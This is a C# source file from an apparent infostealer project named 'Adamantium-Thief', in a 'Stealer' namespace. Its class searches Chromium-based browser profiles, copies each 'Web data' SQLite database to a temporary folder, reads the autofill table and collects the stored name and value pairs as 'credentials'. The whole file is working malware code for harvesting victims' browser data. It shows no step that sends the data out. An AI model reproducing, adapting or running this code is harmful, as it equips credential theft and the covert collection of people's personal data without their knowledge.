/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal class Autofill
    {
        public static List<AutoFill> Get()
        {
            string SqliteFile = "Web data";
            List<AutoFill> Autofills = new List<AutoFill>();
            // Database
            string tempCCLocation = "";

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + SqliteFile;
                if (File.Exists(Browser))
                {
                    tempCCLocation = Environment.GetEnvironmentVariable("temp") + "\\browserAutofill";
                    if (File.Exists(tempCCLocation))
                    {
                        File.Delete(tempCCLocation);
                    }
                    File.Copy(Browser, tempCCLocation);
                } else {
                    continue;
                }

                // Read chrome database
                SQLite sSQLite = new SQLite(tempCCLocation);
                sSQLite.ReadTable("autofill");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string name = sSQLite.GetValue(i, 0);
                    string value = sSQLite.GetValue(i, 1);

                    // If no data => break
                    if (string.IsNullOrEmpty(value))
                    {
                        break;
                    }

                    AutoFill credentials = new AutoFill();
                    credentials.name = Crypt.GetUTF8(name);
                    credentials.value = Crypt.GetUTF8(value);

                    Autofills.Add(credentials);
                    continue;
                }
                continue;
            }
            return Autofills;
        }
    }
}
